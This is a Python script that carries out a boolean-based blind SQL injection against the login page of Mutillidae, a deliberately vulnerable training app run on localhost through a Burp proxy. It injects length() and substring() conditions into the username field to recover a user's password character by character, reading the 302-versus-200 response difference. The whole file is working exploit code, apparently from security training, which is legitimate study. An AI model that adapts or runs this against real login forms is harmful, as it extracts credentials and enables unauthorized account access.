import requests
import sys
import string

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
target = 'http://localhost/mutillidae/index.php?page=login'


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <sql-injection>" % sys.argv[0])
        sys.exit(-1)

    username = sys.argv[1]

    password_length = 0
    len_flag = False
    while password_length < 25 and not len_flag:
        injection = " {}' and length(password)={}#".format(username, password_length)
        post_data = {"username": injection, "password": "", "login-php-submit-button": "Login"}
        r = requests.post(target, proxies=proxies, data=post_data, allow_redirects=False)
        # the case when HTTP/1.1 302 Found, where the body text is empty as observed in Burpsuite
        if len(r.text) == 0:
            print("(+) It works! Password length: {} ".format(password_length))
            len_flag = True
        # the case when HTTP/1.1 200 as observed in Burpsuite
        else:
            print("(-) It doesn't work, try another query")
            password_length += 1

    characters_list = string.printable
    password = ""
    for i in range(1, password_length + 1): 
        char_list_index = 0
        char_flag = False
        while not char_flag and char_list_index < len(characters_list):
            injection = "{}' and substring(password,{},1)='{}'#".format(username, i, characters_list[char_list_index])
            post_data = {"username": injection, "password": "", "login-php-submit-button": "Login"}
            r = requests.post(target, data=post_data, allow_redirects=False)
            # the case when HTTP/1.1 302 Found, where the body text is empty as observed in Burpsuite
            if len(r.text) == 0:
                print("(+) Character {} at position {} is correct".format(characters_list[char_list_index], i))
                char_flag = True
                password += characters_list[char_list_index]
            # the case when HTTP/1.1 200 as observed in Burpsuite
            else:
                print("(-) Character {} at position {} is incorrect".format(characters_list[char_list_index], i))
                char_list_index += 1
        print("(+) Password: {}".format(password))


if __name__ == "__main__":
    main()
